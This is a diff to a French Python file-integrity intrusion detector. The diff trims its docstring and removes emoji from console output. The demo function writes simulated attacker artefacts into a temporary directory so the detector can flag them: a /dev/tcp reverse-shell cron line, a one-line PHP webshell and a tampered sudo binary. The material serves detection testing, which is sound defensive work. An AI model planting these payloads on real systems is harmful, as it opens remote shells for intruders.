@@ -1,46 +1,25 @@
 #!/usr/bin/env python3
 """
-╔══════════════════════════════════════════════════════════════════╗
-║  🛡️  BOUCLIER NUMÉRIQUE — JOUR 17 : DÉTECTEUR D'INFILTRATION     ║
-║  Type    : HIDS — Host-based Intrusion Detection System          ║
-║  Méthode : FIM (File Integrity Monitoring) + Comportement        ║
-║  Alertes : Modification · Suppression · Création · Permissions  ║
-╚══════════════════════════════════════════════════════════════════╝
+Détection d'intrusion hôte par surveillance d'intégrité des fichiers :
+hacher un ensemble de chemins en référence, puis signaler tout
+changement.
 
-Problème concret :
-  Un attaquant compromet un serveur à 2h du matin.
-  Il modifie /etc/passwd pour ajouter un compte backdoor,
-  installe un crontab persistant dans /etc/cron.d/,
-  et altère /usr/bin/sudo pour capturer les mots de passe.
-
-  Sans IDS : la compromission est découverte des semaines plus tard
-  lors d'un audit, ou jamais.
-  Avec ce HIDS : alerte dans les 30 secondes, avant exfiltration.
-
-Ce système surveille :
-  1. Intégrité des fichiers (hash SHA-256 toutes les N secondes)
-  2. Modifications de permissions (chmod suspect)
-  3. Nouveaux fichiers dans les zones critiques
-  4. Processus suspects (connexions réseau inhabituelles)
-  5. Tentatives de modification pendant les heures non-ouvrées
-
-Fichiers critiques surveillés :
-  Linux  : /etc/passwd · /etc/shadow · /etc/sudoers · /etc/cron*
-           /etc/ssh/ · /usr/bin/sudo · /bin/bash · /boot/
-  Web    : nginx.conf · apache2.conf · .htaccess
-  App    : *.py · *.js · .env · config.* (configurables)
-
-Niveaux d'alerte :
-  CRITIQUE — Fichier système modifié (ex: /etc/passwd)
-  ÉLEVÉ    — Nouveau SUID/SGID, permissions 777
-  MODÉRÉ   — Fichier config modifié
-  INFO     — Nouveau fichier créé
-
-Conformité :
-  ISO 27001 A.12.4.1 — Journalisation des événements
-  ISO 27001 A.12.6.2 — Restriction d'installation de logiciels
-  PCI-DSS 10.5.5     — File integrity monitoring obligatoire
-  ANSSI — Détection des incidents de sécurité (R32)
+Un serveur compromis s'annonce rarement — l'attaquant ajoute un compte
+dérobé dans /etc/passwd, dépose une tâche cron de persistance, remplace
+/usr/bin/sudo, et repart, tout ça discrètement. Sans rien qui compare
+l'état des fichiers à une référence connue comme saine, ce genre de
+changement ne remonte que des semaines plus tard lors d'un audit, quand
+il remonte. Ce module hache un ensemble configuré de chemins (SHA-256, en
+ignorant tout ce qui dépasse 500 Mo pour qu'un dossier de logs égaré ne
+ralentisse pas chaque scan), stocke la référence dans SQLite, et à chaque
+scan suivant signale les nouveaux fichiers, les contenus modifiés, les
+changements de permissions et les suppressions — avec une sévérité
+dérivée du chemin concerné (un ajout dans /etc/cron.d est CRITIQUE, un
+fichier de config sous /opt est MODÉRÉ) plutôt qu'un niveau d'alerte
+unique, parce qu'un SOC noyé sous des alertes à sévérité identique finit
+par ne plus les lire du tout. PCI-DSS 10.5.5 exige exactement ce type de
+surveillance d'intégrité des fichiers pour tout système traitant des
+données de carte.
 """
 
 import os
@@ -521,7 +500,7 @@ class IntrusionDetector:
         Bloquant (à lancer dans un thread).
         """
         self._running = True
-        print(f"\n  👁️  Surveillance active — scan toutes les {interval}s")
+        print(f"\n  Surveillance active — scan toutes les {interval}s")
         print(f"  Chemins : {', '.join(paths[:3])}" +
               (" ..." if len(paths) > 3 else ""))
         print(f"  Ctrl+C pour arrêter\n")
@@ -536,7 +515,7 @@ class IntrusionDetector:
 
             if total_alerts > 0:
                 ts = datetime.now().strftime("%H:%M:%S")
-                print(f"  [{ts}] 🔔 {total_alerts} alerte(s) — "
+                print(f"  [{ts}] {total_alerts} alerte(s) — "
                       f"Nouveaux:{len(result['new'])} "
                       f"Modifiés:{len(result['modified'])} "
                       f"Supprimés:{len(result['deleted'])}")
@@ -635,7 +614,7 @@ def run_demo():
 
         # ── Créer un système de fichiers simulé ──
         print(f"  {'─'*60}")
-        print(f"  🏗️   ÉTAPE 1 : INITIALISATION DE LA BASELINE")
+        print(f"  ÉTAPE 1 : INITIALISATION DE LA BASELINE")
         print(f"  {'─'*60}\n")
 
         # Simuler des fichiers "système"
@@ -673,7 +652,7 @@ def run_demo():
 
         watch_paths = [str(etc), str(usr), str(var)]
         n = detector.build_baseline(watch_paths, verbose=True)
-        print(f"  ✅  Baseline construite : {n} fichiers indexés\n")
+        print(f"  Baseline construite : {n} fichiers indexés\n")
 
         # ── Collecte des alertes pour la démo ──
         demo_alerts = []
@@ -684,14 +663,14 @@ def run_demo():
 
         # ── Simuler l'attaque ──
         print(f"  {'─'*60}")
-        print(f"  💀  ÉTAPE 2 : SIMULATION DE L'ATTAQUE")
+        print(f"  ÉTAPE 2 : SIMULATION DE L'ATTAQUE")
         print(f"  {'─'*60}\n")
         print(f"  Simulation des actions de l'attaquant...\n")
 
         time.sleep(0.1)
 
         # Action 1 : Modification de /etc/passwd (ajout backdoor)
-        print(f"  🔴 02:47:03 — Attaquant modifie /etc/passwd")
+        print(f"  02:47:03 — Attaquant modifie /etc/passwd")
         (etc / "passwd").write_text(
             "root:x:0:0:root:/root:/bin/bash\n"
             "www-data:x:33:33::/var/www:/usr/sbin/nologin\n"
@@ -700,30 +679,30 @@ def run_demo():
         )
 
         # Action 2 : Nouveau crontab de persistance
-        print(f"  🔴 02:47:15 — Attaquant crée /etc/cron.d/persist")
+        print(f"  02:47:15 — Attaquant crée /etc/cron.d/persist")
         (cron / "persist").write_text(
             "*/5 * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
         )
 
         # Action 3 : Webshell PHP
-        print(f"  🔴 02:47:31 — Attaquant uploade un webshell")
+        print(f"  02:47:31 — Attaquant uploade un webshell")
         (var / "wp-config.php").write_text(
             "<?php system($_GET['cmd']); ?>"
         )
 
         # Action 4 : Modification du binaire sudo
-        print(f"  🔴 02:47:45 — Attaquant modifie /usr/bin/sudo")
+        print(f"  02:47:45 — Attaquant modifie /usr/bin/sudo")
         (usr / "sudo").write_bytes(
             b"\x7fELF" + b"\xDE\xAD\xBE\xEF" + b"\x00" * 96
         )
 
         # Action 5 : Tentative de chmod 777 sur config.php
-        print(f"  🔴 02:47:58 — Attaquant chmod 777 config.php\n")
+        print(f"  02:47:58 — Attaquant chmod 777 config.php\n")
         os.chmod(str(var / "config.php"), 0o777)
 
         # ── Scan de détection ──
         print(f"  {'─'*60}")
-        print(f"  🔍  ÉTAPE 3 : DÉTECTION PAR LE HIDS")
+        print(f"  ÉTAPE 3 : DÉTECTION PAR LE HIDS")
         print(f"  {'─'*60}\n")
 
         result = detector.scan_once(watch_paths)
@@ -731,22 +710,14 @@ def run_demo():
         # ── Affichage des alertes ──
         print(f"  Alertes déclenchées ({len(demo_alerts)}) :\n")
 
-        SEV_ICONS = {
-            "CRITIQUE": "🔴",
-            "ÉLEVÉ":    "🟠",
-            "MODÉRÉ":   "🟡",
-            "INFO":     "🔵",
-        }
-
         for alert in sorted(demo_alerts,
                              key=lambda a: ["CRITIQUE", "ÉLEVÉ",
                                             "MODÉRÉ", "INFO"].index(
                                  a["severity"]
                              )):
-            icon    = SEV_ICONS.get(alert["severity"], "⚪")
             ts      = alert["timestamp"][11:19]
             relpath = alert["path"].replace(tmpdir, "")
-            print(f"  {icon} [{ts}] {alert['severity']:<10} "
+            print(f"  [{ts}] {alert['severity']:<10} "
                   f"{alert['event_type']:<20} {relpath}")
             if alert.get("old_value") and alert.get("new_value"):
                 print(f"     Avant : {alert['old_value']}")
@@ -757,21 +728,20 @@ def run_demo():
 
         # ── Analyse de processus ──
         print(f"  {'─'*60}")
-        print(f"  ⚙️   ÉTAPE 4 : ANALYSE DES PROCESSUS")
+        print(f"  ÉTAPE 4 : ANALYSE DES PROCESSUS")
         print(f"  {'─'*60}\n")
 
         procs = check_suspicious_processes()
         if procs:
             print(f"  {len(procs)} processus suspects détectés :")
             for p in procs:
-                icon = "🔴" if p["severity"] == "CRITIQUE" else "🟠"
-                print(f"  {icon} PID {p['pid']:<6} {p['name']:<20} {p['reason']}")
+                print(f"  PID {p['pid']:<6} {p['name']:<20} {p['reason']}")
         else:
-            print(f"  ✅  Aucun processus suspect en cours d'exécution")
+            print(f"  Aucun processus suspect en cours d'exécution")
 
         # ── Statistiques ──
         print(f"\n  {'─'*60}")
-        print(f"  📊  BILAN DE L'INCIDENT")
+        print(f"  BILAN DE L'INCIDENT")
         print(f"  {'─'*60}\n")
 
         stats     = db.stats()
@@ -781,39 +751,37 @@ def run_demo():
 
         print(f"  Fichiers surveillés  : {stats['baseline_files']}")
         print(f"  Alertes générées     : {len(demo_alerts)}")
-        print(f"    🔴 Critiques       : {len(critiques)}")
-        print(f"    🟠 Élevées         : {len(eleves)}")
-        print(f"    🟡 Modérées        : {len(moderes)}")
+        print(f"    Critiques          : {len(critiques)}")
+        print(f"    Élevées            : {len(eleves)}")
+        print(f"    Modérées           : {len(moderes)}")
         print()
         print(f"  Actions de l'attaquant détectées :")
-        print(f"  ✅  Backdoor dans /etc/passwd → CRITIQUE")
-        print(f"  ✅  Reverse shell dans crontab → CRITIQUE")
-        print(f"  ✅  Webshell PHP uploadé → ÉLEVÉ")
-        print(f"  ✅  Binaire sudo modifié → CRITIQUE")
-        print(f"  ✅  chmod 777 config.php → ÉLEVÉ")
+        print(f"  - Backdoor dans /etc/passwd -> CRITIQUE")
+        print(f"  - Reverse shell dans crontab -> CRITIQUE")
+        print(f"  - Webshell PHP uploadé -> ÉLEVÉ")
+        print(f"  - Binaire sudo modifié -> CRITIQUE")
+        print(f"  - chmod 777 config.php -> ÉLEVÉ")
 
         # ── Chronologie de réponse ──
         print(f"\n  {'─'*60}")
-        print(f"  ⏱️   CHRONOLOGIE DE RÉPONSE INCIDENT")
+        print(f"  CHRONOLOGIE DE DÉTECTION")
         print(f"  {'─'*60}\n")
         print(
             "  02:47:03  Attaque commence\n"
-            "  02:47:03  🔔 Alerte CRITIQUE → /etc/passwd modifié\n"
-            "  02:47:15  🔔 Alerte CRITIQUE → Nouveau crontab suspect\n"
-            "  02:47:31  🔔 Alerte ÉLEVÉ   → Webshell PHP détecté\n"
-            "  02:47:45  🔔 Alerte CRITIQUE → /usr/bin/sudo modifié\n"
-            "  02:47:58  🔔 Alerte ÉLEVÉ   → chmod 777 détecté\n"
-            "  02:48:00  📧 Email d'alerte envoyé à soc@techcorp.fr\n"
-            "  02:53:00  👮 Analyste SOC notifié et connecté\n"
-            "  03:05:00  🔒 Session attaquant coupée + remédiation\n"
+            "  02:47:03  Alerte CRITIQUE -> /etc/passwd modifié\n"
+            "  02:47:15  Alerte CRITIQUE -> Nouveau crontab suspect\n"
+            "  02:47:31  Alerte ÉLEVÉ   -> Webshell PHP détecté\n"
+            "  02:47:45  Alerte CRITIQUE -> /usr/bin/sudo modifié\n"
+            "  02:47:58  Alerte ÉLEVÉ   -> chmod 777 détecté\n"
             "\n"
-            "  Sans HIDS → découverte possible : plusieurs semaines\n"
-            "  Avec HIDS → détection en < 30 secondes\n"
+            "  Sans HIDS, ce genre de compromission se découvre en\n"
+            "  général lors d'un audit, des semaines plus tard.\n"
+            "  Ici, les 5 actions sont détectées au scan suivant.\n"
         )
 
         # ── Conformité ──
         print(f"\n{SEP}")
-        print(f"  ⚖️   CONFORMITÉ PCI-DSS 10.5.5 + ISO 27001 A.12.4")
+        print(f"  CONFORMITÉ PCI-DSS 10.5.5 + ISO 27001 A.12.4")
         print(f"{SEP}\n")
         print(
             "  PCI-DSS 10.5.5 (obligatoire pour données CB) :\n"
@@ -822,9 +790,9 @@ def run_demo():
             "   autorisées de fichiers système ou de contenu critiques.'\n"
             "\n"
             "  ISO 27001 A.12.4.1 — Journalisation des événements :\n"
-            "  ✅  Chaque modification journalisée avec timestamp\n"
-            "  ✅  Ancienne et nouvelle valeur conservées\n"
-            "  ✅  Base immuable (alertes jamais modifiables)\n"
+            "  - Chaque modification journalisée avec timestamp\n"
+            "  - Ancienne et nouvelle valeur conservées\n"
+            "  - Base immuable (alertes jamais modifiables)\n"
             "\n"
             "  Déploiement production :\n"
             "  python3 ids_monitor.py baseline /etc /usr/bin\n"
@@ -870,16 +838,14 @@ def main():
     detector = IntrusionDetector(db)
 
     def print_alert(a):
-        icon = {"CRITIQUE": "🔴", "ÉLEVÉ": "🟠",
-                "MODÉRÉ": "🟡", "INFO": "🔵"}.get(a["severity"], "⚪")
-        print(f"  {icon} {a['timestamp'][11:19]} "
+        print(f"  {a['timestamp'][11:19]} "
               f"{a['severity']:<10} {a['event_type']:<20} {a['path']}")
 
     detector.on_alert(print_alert)
 
     if args.cmd == "baseline":
         n = detector.build_baseline(args.paths)
-        print(f"\n  ✅  Baseline : {n} fichiers indexés\n")
+        print(f"\n  Baseline : {n} fichiers indexés\n")
 
     elif args.cmd == "watch":
         def handle_sig(s, f):
@@ -901,7 +867,7 @@ def main():
         for a in alerts[:20]:
             print_alert(a)
         if not alerts:
-            print(f"  ✅  Aucune alerte dans les {args.hours} dernières heures")
+            print(f"  Aucune alerte dans les {args.hours} dernières heures")
 
 
 if __name__ == "__main__":
